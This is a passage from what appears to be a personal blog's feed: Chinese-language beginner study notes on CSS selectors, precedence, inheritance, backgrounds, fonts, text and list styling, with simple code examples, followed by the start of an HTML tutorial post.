class="line">div&#123;</span><br><span class="line">color: red;</span><br><span class="line">width: 100px; </span><br><span class="line">height: 100px;</span><br><span class="line">    background: yellow</span><br><span class="line">&#125;</span><br><span class="line">#txt&#123;</span><br><span class="line">color: #1f1;</span><br><span class="line">&#125;</span><br><span class="line">.txt1 &#123;</span><br><span class="line">font-size: 10px;</span><br><span class="line">&#125;</span><br><span class="line">.txt2 &#123;</span><br><span class="line">color: #ff2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>效果：</strong></p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="https://github.com/chumen77/chumen77.github.io/blob/master/tuchuang/css2.png?raw=true" alt title>                </div>                <div class="image-caption"></div>            </figure><h2 id="CSS原理"><a href="#CSS原理" class="headerlink" title="CSS原理"></a>CSS原理</h2><h4 id="优先原则"><a href="#优先原则" class="headerlink" title="优先原则"></a>优先原则</h4><p><strong>优先原则</strong>：后解析的内容，会覆盖掉原来解析的内容。</p><p><strong>1:同一个选择器</strong>:从上往下执行。</p><p>例：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">div&#123;</span><br><span class="line">     color: red;</span><br><span class="line">color: green;  </span><br><span class="line">&#125;/*最终是为绿色*/</span><br></pre></td></tr></table></figure><p><strong>2:同一类型的选择器</strong>：从上往下执行</p><p>例：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">div&#123;</span><br><span class="line">background: yellow;</span><br><span class="line">&#125;</span><br><span class="line">div&#123;</span><br><span class="line">background: red;</span><br><span class="line">&#125;/*最终是为红色*/</span><br></pre></td></tr></table></figure><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">.bg1&#123;</span><br><span class="line">background: yellow;</span><br><span class="line">&#125;</span><br><span class="line">.bg2&#123;</span><br><span class="line">background: blue;</span><br><span class="line">&#125;/*最终是为蓝色*/</span><br></pre></td></tr></table></figure><p><code>&lt;div class=&quot;bg1 bg2&quot;&gt;hahaha&lt;/div&gt;</code>  <strong>在HTML中，bg1 与bg2的位置交换也不管css解析的事情，所以交换后还是blue</strong>。</p><p><strong>3：不同类型的选择器：</strong>看优先级</p><p>先解析低级的在解析高级的：<strong>* &lt; div &lt; class &lt; id</strong></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">div&#123;</span><br><span class="line">color: red；</span><br><span class="line">&#125;</span><br><span class="line">.bg1&#123;</span><br><span class="line">color: yellow;</span><br><span class="line">&#125;   /*最终是为黄色*/</span><br></pre></td></tr></table></figure><p><strong>4：多重样式优先级</strong></p><p>样式可以规定在单个的 HTML 元素中，在 HTML 页的头元素中，或在一个外部的 CSS 文件中。甚至可以在同一个 HTML 文档内部引用多个外部样式表。</p><p>一般情况下，优先级如下：</p><p><strong>内联样式 &gt; 内部样式 &gt;外部样式</strong>      ==（谁优先级越高越最后解析）==</p><p>对于全部都是 当加上<code>!important</code>  这个选择器的内容就会最后进行。 </p><h4 id="继承原则"><a href="#继承原则" class="headerlink" title="继承原则"></a>继承原则</h4><p>==<strong>对于嵌套标签，子级继承父级。</strong>==</p><ol><li>文字 文本 样式可以继承，其他的不能。 </li><li>块级元素 没有设置的时候，会继承父级的<strong>宽</strong>，而高度则是看其内容长短。</li></ol><h2 id="CSS组成选择器"><a href="#CSS组成选择器" class="headerlink" title="CSS组成选择器"></a>CSS组成选择器</h2><h4 id="分组选择器"><a href="#分组选择器" class="headerlink" title="分组选择器"></a>分组选择器</h4><p>直接上代码了：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">div&#123;</span><br><span class="line">background: green;</span><br><span class="line">color: red;</span><br><span class="line">&#125;</span><br><span class="line">p&#123;</span><br><span class="line">   background: green;</span><br><span class="line">color: red;</span><br><span class="line">   font-size: 50px;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">div,p&#123;</span><br><span class="line">background: green;</span><br><span class="line">color: red;</span><br><span class="line">&#125;</span><br><span class="line">p&#123;</span><br><span class="line">   font-size: 50px;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>把div 与 p 里面相同的部分放到一个里面就行了。</strong></p><h4 id="嵌套选择器"><a href="#嵌套选择器" class="headerlink" title="嵌套选择器"></a>嵌套选择器</h4><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">div p&#123;</span><br><span class="line">background: green;</span><br><span class="line">color: red;</span><br><span class="line">font-size: 50px;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span>&gt;</span> div1</span><br><span class="line"><span class="tag">&lt;<span class="name">div</span>&gt;</span>div2</span><br><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span>p2<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">ul</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">li</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span>p3<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span>p1<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br></pre></td></tr></table></figure><p><strong>只要在其父或父的以上级有div，那这个p里的东西就能生效</strong>。</p><p>效果：</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="https://github.com/chumen77/chumen77.github.io/blob/master/tuchuang/css3.jpg?raw=true" alt title>                </div>                <div class="image-caption"></div>            </figure><h4 id="子选择器"><a href="#子选择器" class="headerlink" title="子选择器"></a>子选择器</h4><p><strong>这个和以上很类似，区别在只在其父为div时，才能生效。</strong></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">div&gt;p&#123;</span><br><span class="line">background: green;</span><br><span class="line">color: red;</span><br><span class="line">font-size: 50px;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>类比以上就是只有p2有css效果</strong></p><h4 id="同级选择器"><a href="#同级选择器" class="headerlink" title="同级选择器"></a>同级选择器</h4><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">div+p&#123;</span><br><span class="line">background: green;</span><br><span class="line">color: red;</span><br><span class="line">font-size: 50px;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在平级的p才可以生效，对比以上，也就是p1是有css效果。</p><h2 id="属性选择器"><a href="#属性选择器" class="headerlink" title="属性选择器"></a>属性选择器</h2><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">p[title=cc]&#123;</span><br><span class="line">background: green;</span><br><span class="line">color: red;</span><br><span class="line">font-size: 50px;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span>&gt;</span> div1</span><br><span class="line"><span class="tag">&lt;<span class="name">div</span>&gt;</span>div2</span><br><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span>p2<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">ul</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">li</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span> <span class="attr">title</span>=<span class="string">"cc"</span>&gt;</span>p3<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span> <span class="attr">title</span>=<span class="string">"cc 1"</span>&gt;</span>p1<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br></pre></td></tr></table></figure><p>基本标签==+==</p><ul><li><p>[属性=值]：p3出现css效果。</p></li><li><p>[属性~=值]：p1 p3出现css效果。  注意：代码中<code>cc 1</code>需要空格隔开，不隔没有效果。</p></li><li><p>[属性^=值]：开头有cc的字符就行<code>cc1</code>. p1 p3 出现cc效果。</p></li><li><p>[属性$=值]：类比<code>^=</code>  是结束。</p></li></ul><h2 id="伪元素选择器"><a href="#伪元素选择器" class="headerlink" title="伪元素选择器"></a>伪元素选择器</h2><p>每个我自己写出来的元素都会有伪元素。、</p><p>例：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">p</span> <span class="attr">title</span>=<span class="string">"cc"</span>&gt;</span></span><br><span class="line"> <span class="comment">&lt;!--&lt;before&gt; --&gt;</span></span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">ppp</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  <span class="comment">&lt;!--&lt;after&gt; --&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br></pre></td></tr></table></figure><p>直接上代码：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">p::before&#123;</span><br><span class="line">content: "before"</span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line">p::after&#123;</span><br><span class="line">content: "after"</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>效果：</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="https://github.com/chumen77/chumen77.github.io/blob/master/tuchuang/css4.jpg?raw=true" alt title>                </div>                <div class="image-caption"></div>            </figure><p><strong>块元素：</strong></p><p>第一个字母：<code>first-letter</code></p><p>第一行：<code>first-line</code></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">p::first-letter&#123;</span><br><span class="line">color: red;</span><br><span class="line">font-size: 100px;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这些写就是会是p内内容第一个<strong>字符</strong>大写。</p><p>也可以为</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">p</span> <span class="attr">title</span>=<span class="string">"cc"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">first-letter</span>&gt;</span>t</span><br><span class="line"><span class="tag">&lt;/<span class="name">first-letter</span>&gt;</span></span><br><span class="line">he way i am ;</span><br><span class="line"><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="CSS-背景"><a href="#CSS-背景" class="headerlink" title="CSS 背景"></a>CSS 背景</h2><p>CSS 背景属性用于定义HTML元素的背景。</p><h4 id="背景颜色"><a href="#背景颜色" class="headerlink" title="背景颜色"></a>背景颜色</h4><p><code>background-color</code> 属性定义了元素的背景颜色.</p><p>页面的背景颜色使用在body的选择器中:</p><p><code>body {background-color:red;}</code></p><h4 id="背景图像"><a href="#背景图像" class="headerlink" title="背景图像"></a>背景图像</h4><p><code>background-image</code>属性描述了元素的背景图像.</p><p>默认情况下，背景图像进行<strong>平铺重复</strong>显示.</p><p><code>body {background-image:url(&#39;1.png&#39;);}</code></p><h4 id="背景图像-相关设置"><a href="#背景图像-相关设置" class="headerlink" title="背景图像 - 相关设置"></a>背景图像 - 相关设置</h4><ul><li><p><strong>水平或垂直平铺</strong>：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">body</span><br><span class="line">&#123;</span><br><span class="line">background-image:url('gradient2.png');</span><br><span class="line">background-repeat:repeat-x;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>里面repeat-x是x轴，repeat-y是y轴。</p></li><li><p><strong>不平铺：</strong><code>background-repeat:no-repeat</code></p></li><li><p><strong>定位：</strong></p></li></ul><p>​      <code>background-position:50% 0%</code> 这使其在x轴的中心，</p><p>​        x： left center right；</p><p>​        y:  top center bottom；</p><h2 id="css字体"><a href="#css字体" class="headerlink" title="css字体"></a>css字体</h2><h4 id="css字体-1"><a href="#css字体-1" class="headerlink" title="css字体"></a>css字体</h4><ul><li><p><strong>字体系列</strong>：font-family 属性设置文本的字体系列，应该设置几个字体名称作为一种”后备”机制。</p><p>例：<code>font-family:&quot;黑体&quot;, &quot;宋体&quot;,&quot;微软黑雅&quot;;</code></p></li><li><p><strong>字体样式</strong>:<code>font-style:italic;</code>斜体</p></li><li><p><strong>字体大小</strong>：font-size 属性设置文本的大小。<code>font-size:40px;</code> font-weight: 设置其粗细。font-weight:</p><p>normal lighter blod;</p></li></ul><p>练习：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">body &#123;</span><br><span class="line">font-family: "黑体","宋体";</span><br><span class="line">font-style:italic;</span><br><span class="line">font-size:80px;</span><br><span class="line">font-weight: bold;</span><br><span class="line">&#125;  /*5.css */</span><br></pre></td></tr></table></figure><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE html&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">"en"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"UTF-8"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>文字-字体<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">"stylesheet"</span> <span class="attr">type</span>=<span class="string">"text/css"</span> <span class="attr">href</span>=<span class="string">"5.css"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">这是一段字</span><br><span class="line"><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">hello world!</span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="CSS-文本"><a href="#CSS-文本" class="headerlink" title="CSS - 文本"></a>CSS - 文本</h2><h4 id="文本属性集合"><a href="#文本属性集合" class="headerlink" title="文本属性集合"></a>文本属性集合</h4><ul><li><strong>color属性用于设置文本的颜色</strong></li><li><strong>direction属性用于设置文本方向。</strong></li><li><strong>letter-spacing属性用于在组成单词的字母之间添加或减去空格。</strong> </li><li><strong>text-indent属性用于缩进段落的文本。</strong></li><li><strong>text-align属性用于对齐文档的文本。</strong> </li><li><strong>text-decoration属性用于下划线，上划线和删除文本。</strong></li><li><strong>text-transform属性用于大写文本或将文本转换为大写或小写字母。</strong></li><li><strong>white-space属性用于控制文本的流和格式。</strong></li><li><strong>text-shadow属性用于设置文本周围的文本阴影。</strong></li></ul><h4 id="文本颜色："><a href="#文本颜色：" class="headerlink" title="文本颜色："></a>文本颜色：</h4><ul><li>十六进制值 - 如: <strong>＃FF0000</strong></li><li>一个RGB值 - 如: <strong>RGB(255,0,0)</strong>     ==不推荐使用太多浏览器不支持==</li><li>颜色的名称 - 如: <strong>red</strong></li></ul><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">body &#123;color:red;&#125;</span><br><span class="line">h1 &#123;color:#00ff00;&#125;</span><br><span class="line">h2 &#123;color:rgb(255,0,0);&#125;</span><br></pre></td></tr></table></figure><h4 id="文本的对齐方式"><a href="#文本的对齐方式" class="headerlink" title="文本的对齐方式"></a>文本的对齐方式</h4><p>文本可居中或对齐到左或右,两端对齐.</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">.a1&#123;</span><br><span class="line">text-align:right;</span><br><span class="line">&#125;</span><br><span class="line">.a2&#123;</span><br><span class="line"></span><br><span class="line">text-align:center;</span><br><span class="line">&#125;</span><br><span class="line">.a3&#123;</span><br><span class="line">text-align:left;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span> <span class="attr">class</span>=<span class="string">"a1"</span>&gt;</span>这是一段字<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">p</span> <span class="attr">class</span>=<span class="string">"a2"</span>&gt;</span>hello world!<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">p</span> <span class="attr">class</span>=<span class="string">"a3"</span>&gt;</span>hhhhaaaa<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br></pre></td></tr></table></figure><h4 id="文本修饰"><a href="#文本修饰" class="headerlink" title="文本修饰"></a>文本修饰</h4><p>装饰文字，值为none（去掉修饰），underline，overline，line-through，blink。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">.a1&#123;</span><br><span class="line">text-decoration:overline;</span><br><span class="line">&#125;</span><br><span class="line">.a2&#123;</span><br><span class="line"></span><br><span class="line">text-decoration:line-through;</span><br><span class="line">&#125;</span><br><span class="line">.a3&#123;</span><br><span class="line">text-decoration:underline;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="文本缩进"><a href="#文本缩进" class="headerlink" title="文本缩进"></a>文本缩进</h4><p>文本缩进属性是用来指定文本的第一行的缩进。</p><p><code>p {text-indent:50px;}</code></p><h4 id="文本方向"><a href="#文本方向" class="headerlink" title="文本方向"></a>文本方向</h4><p>值是ltr或rtl。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">.a&#123;</span><br><span class="line">  direction:rtl;   </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>文字就先写到这。</p><h2 id="CSS-链接"><a href="#CSS-链接" class="headerlink" title="CSS 链接"></a>CSS 链接</h2><h4 id="链接样式"><a href="#链接样式" class="headerlink" title="链接样式"></a>链接样式</h4><ol><li><strong>a:link - 正常，未访问过的链接</strong></li><li><strong>a:visited - 用户已访问过的链接</strong></li><li><strong>a:hover - 当用户鼠标放在链接上时</strong></li><li><strong>a:active - 链接被点击的那一刻</strong></li></ol><p><code>a:link {color: red;}</code></p><h2 id="CSS列表"><a href="#CSS列表" class="headerlink" title="CSS列表"></a>CSS列表</h2><p>常用的就是</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">ul&#123;</span><br><span class="line">    list-style-type: none;  </span><br><span class="line">    list-style-type: disc;    实心圆</span><br><span class="line">    list-style-type: circle;    空心圆</span><br><span class="line">    list-style-type: square;      实心方格</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>最常用就是 none 然后换成自己想弄成的图片。</p><p> ol 对应就是 <code>lower-alpha</code>  <code>upper-alpha</code> <code>lower-roman</code>等等；</p><p><strong>作为列表项标记的图像</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">ul</span><br><span class="line">&#123;</span><br><span class="line">    list-style-image: url(&apos;&apos;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;CSS&quot;&gt;&lt;a href=&quot;#CSS&quot; class=&quot;headerlink&quot; title=&quot;CSS&quot;&gt;&lt;/a&gt;CSS&lt;/h1&gt;&lt;h2 id=&quot;如何使用CSS&quot;&gt;&lt;a href=&quot;#如何使用CSS&quot; class=&quot;headerlink&quot; title=&quot;如何使用CSS
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>HTML学习</title>
    <link href="https://chumen77.github.io/2019/03/29/HTML/"/>
    <id>https://chumen77.github.io/2019/03/29/HTML/</id>
    <published>2019-03-29T12:04:07.000Z</published>
    <updated>2019-10-15T16:05:00.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="HTML-学习"><a href="#HTML-学习" class="headerlink" title="HTML 学习"></a>HTML 学习</h1><h2 id="HTML-基础"><a href="#HTML-基础" class="headerlink" title="HTML 基础"></a>HTML 基础</h2><ol><li><strong>HTML标题</strong>：是通过 <code>&lt;h1&gt; - &lt;h6&gt;</code> 标签来定义的.；其会因为数字变化而显示的字体大小变化；</li><li><strong>HTML段落</strong>：通过标签<code>&lt;p&gt;</code> 来定义的.</li><li><strong>HTML链接</strong>：通过标签<code>&lt;a&gt;</code>来定义的。</li><li><strong>HTML图像</strong>：通过标签 <code>&lt;img&gt;</code> 来定义的。</li></ol><h2 id="HTML-文本"><a href="#HTML-文本" class="headerlink" title="HTML 文本"></a>HTML 文本</h2><h4 id="HTML-标题"><a href="#HTML-标题" class="headerlink" title="HTML 标题"></a>HTML 标题</h4><p>标题（Heading）是通过<code>&lt;h1&gt; - &lt;h6&gt;</code> 标签进行定义的.<code>&lt;h1&gt;</code> 定义最大的标题。 <code>&lt;h6&gt;</code>定义最小的标题。<strong>浏览器会自动地在标题的前后添加空行。</strong></p><ul><li><p>标题很重要：</p><p>不要仅仅是为了生成<strong>粗体</strong>或<strong>大号</strong>的文本而使用标题，而是==为了用户可以通过标题来快速浏览您的网页应该将 h1 用作主标题==（最重要的），其后是 h2（次重要的），再其次是 h3，以此类推。</p></li></ul><h4 id="HTML-注释"><a href="#HTML-注释" class="headerlink" title="HTML 注释"></a>HTML 注释</h4><p><strong>注释</strong>： 开始括号之后（左边的括号）需要紧跟一个叹号，结束括号之前（右边的括号）不需要，合理地使用注释可以对未来的代码编辑工作产生帮助。。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- 这是一个注释 --&gt;</span></span><br></pre></td></tr></table></figure><h4 id="HTML-段落"><a href="#HTML-段落" class="headerlink" title="HTML 段落"></a>HTML 段落</h4><p>浏览器会自动地在段落的前后添加空行。<strong>（<code>&lt;/p&gt;</code>是块级元素）</strong></p><h4 id="HTML-水平线"><a href="#HTML-水平线" class="headerlink" title="HTML 水平线"></a>HTML 水平线</h4><p>1：<code>&lt;hr&gt;</code>标签在 HTML 页面中创建水平线。</p><h4 id="HTML-文本格式化"><a href="#HTML-文本格式化" class="headerlink" title="HTML 文本格式化"></a>HTML 文本格式化</h4><p>通常用到<code>&lt;strong&gt;&lt;em&gt;&lt;del&gt;</code>这几个标签。</p><h4 id="练习："><a href="#练习：" class="headerlink" title="练习："></a>练习：</h4><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE html&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">"en"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"UTF-8"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>文本<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- &lt;h1&gt;标题1&lt;/h1&gt;</span></span><br><span class="line"><span class="comment">&lt;h2&gt;标题2&lt;/h2&gt;</span></span><br><span class="line"><span class="comment">&lt;h3&gt;标题3&lt;/h3&gt;</span></span><br><span class="line"><span class="comment">&lt;h4&gt;标题4&lt;/h4&gt;</span></span><br><span class="line"><span class="comment">&lt;h5&gt;标题5&lt;/h5&gt;</span></span><br><span class="line"><span class="comment">&lt;h6&gt;标题6&lt;/h6&gt; --&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- &lt;h&gt;标签有大小之分 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h2</span>&gt;</span>五花山<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line"><span 